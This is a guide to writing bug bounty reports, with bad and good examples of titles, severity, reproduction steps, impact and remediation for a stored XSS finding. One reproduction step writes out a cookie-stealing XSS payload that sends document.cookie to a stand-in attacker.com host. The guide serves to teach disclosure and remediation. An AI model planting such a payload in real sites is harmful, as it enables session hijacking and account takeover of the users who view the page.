# Report Writing Guide for Bug Bounty

## Introduction

A bug bounty report is the deliverable that determines whether your finding gets accepted, rewarded, and resolved. Even a critical vulnerability can be rejected if the report is unclear, incomplete, or fails to demonstrate impact. This guide covers the structure of effective bug bounty reports, with before-and-after examples showing the difference between reports that get rewarded and reports that get closed.

The key principle is: write your report so that a triager can reproduce the bug in under five minutes and understand the business impact in one sentence. Every additional minute a triager spends understanding your report reduces your chance of a timely resolution.

## Practical Steps

### 1. Title Format

The title should summarize the vulnerability type, affected component, and impact in a single line.

**Bad title:**
```
XSS on your website
```

**Good title:**
```
Stored XSS in User Profile Bio allows session hijacking of any visitor (CRITICAL)
```

**Title formula:**

```
[Vulnerability Type] in [Affected Component] allows [Impact] ([Severity])
```

Examples:

```
SSRF via image URL parameter enables access to AWS metadata credentials (HIGH)
IDOR in /api/v2/orders/{id} exposes all customer PII (CRITICAL)
Reflected XSS in search parameter bypasses CSP via base tag injection (MEDIUM)
```

### 2. Severity Justification

Map the finding to a CVSS score or the platform severity criteria:

**Bad justification:**
```
This is critical because XSS is dangerous.
```

**Good justification:**
```
Severity: HIGH (CVSS 7.5)

Justification: This stored XSS executes in the context of the admin dashboard
(/admin/users). Any administrator viewing the compromised user profile will have
their session token exfiltrated. The admin dashboard has access to all customer
PII including SSNs and payment data. No user interaction is required beyond
viewing the user management page, which is part of the daily admin workflow.
```

### 3. Reproduction Steps

Write numbered, step-by-step instructions that anyone can follow:

**Bad reproduction:**
```
Just put a script tag in the comment field and it executes.
```

**Good reproduction:**
```
1. Log in as a standard user (test@demo.com / Password123!)
2. Navigate to https://target.com/profile/edit
3. In the "Bio" field, enter the following payload:
   <img src=x onerror="fetch('https://attacker.com/log?c='+document.cookie)">
4. Click "Save Profile"
5. Log in as an administrator (admin@demo.com / AdminPass456!)
6. Navigate to https://target.com/admin/users
7. Observe the network request to attacker.com with the admin session cookie
8. The admin session is now compromised

Expected behavior: The bio content should be HTML-encoded before rendering.
Actual behavior: The bio content is rendered as raw HTML, executing JavaScript.
```

### 4. Impact Analysis

Clearly state what an attacker can achieve:

**Bad impact:**
```
An attacker can steal cookies.
```

**Good impact:**
```
Business Impact:

- Full account takeover of any administrator who views the compromised profile
- Access to the admin panel which contains PII for 50,000+ customers
- Ability to modify user roles, granting attacker persistent admin access
- Potential for lateral movement into internal systems via admin API endpoints
- Regulatory exposure under GDPR Article 32 (failure to protect personal data)
```

### 5. Remediation Suggestions

Provide actionable fix recommendations:

**Bad remediation:**
```
Fix the XSS.
```

**Good remediation:**
```
Remediation Recommendations:

1. Output Encoding: HTML-encode all user-generated content before rendering.
   Use a library like DOMPurify (frontend) or the server-side template
   engine's built-in escaping.

2. Content Security Policy: Implement a strict CSP header:
   Content-Security-Policy: default-src 'self'; script-src 'self'

3. Input Validation: Sanitize the bio field server-side to strip HTML tags:
   bio = bleach.clean(user_input, tags=[], strip=True)

4. HttpOnly Cookies: Mark session cookies as HttpOnly to prevent JavaScript
   access even if XSS occurs:
   Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 6. Full Report Template

```
Title: [Vulnerability Type] in [Component] allows [Impact]

Severity: [CRITICAL/HIGH/MEDIUM/LOW]
CVSS Score: [X.X]

Description:
[A 2-3 sentence summary of what the vulnerability is and where it exists]

Steps to Reproduce:
1. [Step]
2. [Step]
...

Proof-of-Concept:
[Link to PoC or inline code]

Impact:
[What an attacker can achieve]

Remediation:
[How to fix it]

References:
[Links to OWASP, CVEs, or relevant documentation]
```

## References

- HackerOne Hacktivity (top reports): https://hackerone.com/hacktivity
- Bugcrowd Vulnerability Rating Taxonomy: https://bugcrowd.com/vulnerability-rating-taxonomy
- OWASP Bug Bounty Template: https://owasp.org/www-project-bug-bounty-template/
- CVSS Calculator: https://www.first.org/cvss/calculator/3.1
- PortSwigger Web Security Academy: https://portswigger.net/web-security
